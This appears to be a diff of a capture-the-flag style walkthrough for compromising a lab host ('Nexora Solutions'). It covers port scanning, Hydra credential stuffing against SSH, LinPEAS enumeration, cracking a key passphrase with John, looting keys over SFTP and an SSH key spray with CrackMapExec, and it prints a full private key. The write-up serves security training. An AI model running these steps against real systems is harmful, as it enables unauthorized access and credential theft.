@@ -22,7 +22,7 @@ Run NMAP to discover what ports are open on the target:
 ```bash
 sudo nmap $ip -Pn -n -oA discScan
 ```
-```bash         
+<PRE>         
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 00:41 EST
 Nmap scan report for 10.10.43.128
 Host is up (0.21s latency).
@@ -31,7 +31,7 @@ PORT   STATE SERVICE
 22/tcp open  ssh
 
 Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
-```
+</PRE>
 Use SSH's debug mode to identify the pertinent information to the server:  
 - protocol
 - Version of SSH  
@@ -43,7 +43,7 @@ Use SSH's debug mode to identify the pertinent information to the server:
 ```bash
 ssh -v $ip
 ```
-```bash
+<PRE>
 debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
 debug1: SSH2_MSG_SERVICE_ACCEPT received
 
@@ -69,7 +69,7 @@ debug1: Will attempt key: /home/not-root/.ssh/id_ed25519
 debug1: Will attempt key: /home/not-root/.ssh/id_ed25519_sk 
 debug1: Will attempt key: /home/not-root/.ssh/id_xmss 
 
-```
+</PRE>
 What do we know:  
 - SSH Authentication Methods: Publickey and Password  
 - Possible Naming Convention: j_davis = f_last
@@ -121,7 +121,7 @@ With our users.txt and the breached credentials list, we can initiate the Creden
 hydra -L users.txt -P breachedCreds.txt $ip ssh
 ```
 
-  ```bash
+<PRE>
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:17
@@ -132,7 +132,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:
 [22][ssh] host: 10.10.43.128   login: m_brown   password: **********
 1 of 1 target successfully completed, 2 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07
-```
+</PRE>
 Use the newly found credentials to gain your initial foothold, and get the userFlag.txt.
 ```bash
 ssh j_moore@$ip
@@ -162,17 +162,17 @@ bash linpeas.sh
 Key Information from LinPEAS
 - j_moore is part of the sftp_service group
 - There are private keys stored on the sftp server and j_moore can access the following keys:
-```bash
+<PRE>
 ══╣ Possible private SSH keys were found!
 /home/j_moore/.ssh/id_rsa
 /home/sftp/uploads/.temp_keys/id_rsa_backup_script
 /home/sftp/uploads/.temp_keys/id_rsa_contractor1
 /home/sftp/uploads/.temp_keys/id_rsa_audit
-```
+</PRE>
 - Barbara's private key can only be accessed directory from the SFTP service.
-```bash
+<PRE>
 -rw------- 1 sftp sftp_service 3435 Jan  3 01:56 /home/sftp/uploads/.temp_keys/id_rsa_barbara
-```
+</PRE>
 What do we know:
 - Nexora-Solutions uses publickeys to access services and accounts
 - SSH Key Sprawl is evident and likely.
@@ -196,7 +196,7 @@ Log into the sftp service using j_moore's id_rsa:
 ```bash
 sftp -i id_rsa sftp@$ip
 ```
-```bash
+<PRE>
 The authenticity of host '10.10.64.168 (10.10.64.168)' can't be established.
 ED25519 key fingerprint is SHA256:RPye4zEVR50BH+C2h4qT0zFRbYVknKzA3S/aP0fddoc.
 This key is not known by any other names
@@ -218,7 +218,7 @@ For assistance, contact:
   j_davis@nexora-solutions.com
 
 Enter passphrase for key 'id_rsa': 
-```
+</PRE>
 Before we can log into the sftp service, we will need to crack the passphrase
 associated to the id_rsa key.  
 
@@ -232,7 +232,7 @@ Step 3: Use John or Hashcat to crack the hash (assuming it is a weak password).
 ```bash
 john moore.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-```bash
+<PRE>
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
@@ -243,7 +243,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 1g 0:00:00:08 DONE (2025-01-06 01:08) 0.1194g/s 40.14p/s 40.14c/s 40.14C/s nicholas..olivia
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
-```
+</PRE>
 With the id_rsa passphrase, we can now test j_moore's id_rsa agains the sftp service.
 ```bash
 sftp -i id_rsa sftp@$ip
@@ -256,14 +256,15 @@ sftp>
 
 ### sftp, Lateral Move to net-admin
 #### Enumerating SFTP Documents
-Step 1: 'get' copies of all the documents and sift through the information.
+Get copies of all the documents and sift through the information.
 
 ```bash
 cd uploads
 get -r *
+get .temp_keys
 ```
 <details> 
-<summary>Example Output</summary>
+<summary>Output for 'get -r *' Command</summary>
 <pre>
 Fetching /uploads/conf.bak/ to conf.bak
 Retrieving /uploads/conf.bak
@@ -292,9 +293,162 @@ Ticket#NX-001                                                                   
 </pre>
 </details>
 
+#### Identifying the Next Attack
 
+**What do we know**:  
+- There was a request to audit the SSH Keys; however, the task was never completed.
+- Barbara Harris had access to critical systems.
+<details>
+<summary>Key Audit Information /home/sftp/uploads/.temp_keys/README.md</summary>
+<PRE>
 
- 
+# Key Management Audit - Nexora Solutions
+
+## Overview
+This directory contains keys related to various users, contractors, and automation scripts. A key audit was initiated following the last security assessment but remains incomplete due to Barbara Harris's termination. The following keys require immediate review:
+
+- **id_rsa_barbara**: Barbara's personal key for accessing critical systems.
+- **id_rsa_contractor1**: A contractor's temporary access key. Usage expired months ago.
+- **id_rsa_audit**: Key created during an external audit. No longer needed.
+- **id_rsa_backup_script**: Used for automated configuration backups of routers and switches.
+
+## Action Required
+1. Delete unused keys.
+2. Ensure only authorized keys remain in use.
+3. Document all actions taken for compliance.
+
+### Status
+**Pending** - Assigned to Barbara Harris (Task incomplete due to termination).
+
+### Notes
+Failure to address key sprawl risks may lead to unauthorized access and breaches.
+</PRE>
+</details>
+
+- Barbara Harris does not have a profile on the server.
+<details>
+<summary>List Of Users With a Profile</summary>
+<PRE>
+drwxr-xr-x 12 root      root      4096 Jan  3 02:23 .
+drwxr-xr-x 20 root      root      4096 Dec 28 04:30 ..
+drwxr-x---  3 d_wilson  d_wilson  4096 Jan  2 21:08 d_wilson
+drwxr-x---  3 e_johnson e_johnson 4096 Jan  2 21:08 e_johnson
+drwxr-x---  3 j_davis   j_davis   4096 Jan  2 21:08 j_davis
+drwxr-x---  6 j_moore   j_moore   4096 Jan  2 21:36 j_moore
+drwxr-x---  3 j_smith   j_smith   4096 Jan  2 21:08 j_smith
+drwxr-x---  5 m_brown   m_brown   4096 Jan  2 21:08 m_brown
+drwxr-x---  4 net-admin net-admin 4096 Jan  2 21:08 net-admin
+drwxr-x---  3 s_miller  s_miller  4096 Jan  2 21:08 s_miller
+drwxr-xr-x  4 root      root      4096 Jan  2 21:08 sftp
+drwxr-x---  4 sys-admin sys-admin 4096 Jan  2 21:08 sys-admin
+</PRE>
+</details>
+
+**What do we have**:  
+- Barbara's private key.
+<details>
+<summary>id_rsa</summary>
+<PRE>
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+PhFf/BQmCm2vGv6AtRgitU0S4=
+-----END OPENSSH PRIVATE KEY-----
+
+</PRE>
+</details>
+
+**What can we do**:  
+- Conduct a SSH Key Spray Attack
+
+##### Crafting the Key Spray Attack
+
+- Step 1:
+  Create a user list to spray against:
+  ```bash
+  ls /home > users.txt
+  ```
+<details>
+<summary>List of Users</summary>
+<PRE>
+d_wilson
+e_johnson
+j_davis
+j_moore
+j_smith
+m_brown
+net-admin
+s_miller
+sftp
+sys-admin
+</PRE>
+</details>
+
+- Step 2:
+  Ensure Barbara's id_rsa has the correct privileges:
+  ```bash
+  chmod 600 id_rsa_barbara
+  ```
+###### Execute the SSH Key Spray
+
+Use CrackMapExec (CME) to conduct the Key Spray:
+```bash
+crackmapexec ssh $ip -u users.txt --key-file id_rsa_barbara -p ''
+```
+<details>
+<summary>CME Syntax</summary>
+<PRE>
+ssh = the service CME is working againts
+-u = /location/to/username/list.txt
+--key-file = /location/to/id_rsa
+-p = passphrase for the id_rsa (if applicable)
+</PRE>
+</details>
 
 ## Privilege Escalation (MITRE ATT&CK Outline)
 
